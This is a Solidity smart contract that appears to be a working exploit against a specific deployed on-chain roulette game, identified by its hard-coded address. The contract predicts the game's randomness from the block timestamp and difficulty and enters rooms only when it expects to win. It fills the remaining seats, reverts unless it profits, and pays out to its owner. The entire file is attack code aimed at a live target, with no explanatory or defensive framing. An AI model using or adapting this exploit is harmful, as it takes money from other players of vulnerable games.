pragma solidity ^0.5.0;

interface TargetInterface {
  function getRoom(uint256 _roomId) external view returns (string memory name, address[] memory players, uint256 entryPrice, uint256 balance);
  function enter(uint256 _roomId) external payable;
}

contract Proxy_RuletkaIo {

    address payable private targetAddress = 0xEf02C45C5913629Dd12e7a9446455049775EEC32;
    address payable private owner;

    constructor() public payable {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function ping(uint256 _roomId, bool _keepBalance) public payable onlyOwner {
        TargetInterface target = TargetInterface(targetAddress);

        address[] memory players;
        uint256 entryPrice;

        (, players, entryPrice,) = target.getRoom(_roomId);

        uint256 playersLength = players.length;
        
        require(playersLength > 0 && playersLength < 6);
        require(uint256(uint256(keccak256(abi.encodePacked(block.timestamp, block.difficulty))) % 6) < playersLength);
        
        uint256 stepCount = 6 - playersLength;
        uint256 ourBalanceInitial = address(this).balance;
        
        for (uint256 i = 0; i < stepCount; i++) {
            target.enter.value(entryPrice)(_roomId);
        }

        require(address(this).balance > ourBalanceInitial);
        
        if (!_keepBalance) {
            owner.transfer(address(this).balance);
        }
    }

    function withdraw() public onlyOwner {
        owner.transfer(address(this).balance);
    }

    function kill() public onlyOwner {
        selfdestruct(owner);
    }

    function() external payable {
    }

}